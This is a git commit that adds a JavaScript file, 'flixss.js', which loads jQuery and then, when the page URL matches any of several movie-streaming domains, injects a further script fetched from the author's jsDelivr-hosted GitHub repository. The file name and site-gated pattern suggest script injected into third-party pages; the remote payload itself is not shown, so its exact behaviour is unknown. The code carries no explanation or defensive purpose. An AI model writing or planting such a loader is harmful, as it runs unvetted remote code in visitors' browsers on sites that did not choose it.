6be88e42913f57a16567ec28323036196f1da6d0
gistmib <97446697+gistmib@users.noreply.github.com>
2022-01-21 16:54:21 -0300

    Create flixss.js

---
+++ mindg/flixss.js
@@ -0,0 +1,16 @@
+var head= document.getElementsByTagName('body')[0];
+var scriptxx= document.createElement('script');
+scriptxx.src= 'https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.1.min.js';
+scriptxx.type = "text/javascript"; 
+scriptxx.async = false; 
+head.appendChild(scriptxx); 
+var x= document.createElement('script'); 
+x.src= 'https://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js'; 
+x.type = "text/javascript"; 
+x.async = false; 
+head.appendChild(x); 
+scriptxx.onload=function( evt ) { (function($){ 
+  function kk() { } var g = window.location.href; if (g != null && g.startsWith('https://megahdfilmes.me') || g.startsWith('http://megahdfilmes.me') || g.startsWith('https://megahdfilmes.com')|| g.startsWith('https://megahdseries.com')){ kk(); var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/m/b.js"); document.getElementsByTagName("head")[0].appendChild(link); } else if (g != null && g.startsWith('https://thefilmes.tv') || g.startsWith('http://thefilmes.tv')){ var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/m/b.js"); document.getElementsByTagName("head")[0].appendChild(link); }else if (g != null && g.startsWith('https://flixfilmes.org/imdb/') || g.startsWith('http://flixfilmes.org/imdb/')){ kk(); var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/m/b.js"); document.getElementsByTagName("head")[0].appendChild(link); } else if (g != null && g.startsWith('https://flixfilmes.org/?s=') || g.startsWith('http://flixfilmes.org/?s=')){ kk(); var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/m/b.js"); document.getElementsByTagName("head")[0].appendChild(link); }else if (g != null && g.startsWith("https://www.superflix.net")) { var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/m/b.js"); document.getElementsByTagName("head")[0].appendChild(link); }else if (g != null && g.startsWith('https://megafilmeshd50') || g.startsWith('http://megafilmeshd50')){ kk(); var link; link = document.createElement("script"); link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/m/b.js"); document.getElementsByTagName("head")[0].appendChild(link); } 
+})(jQuery); 
+                                }
+check = "true";
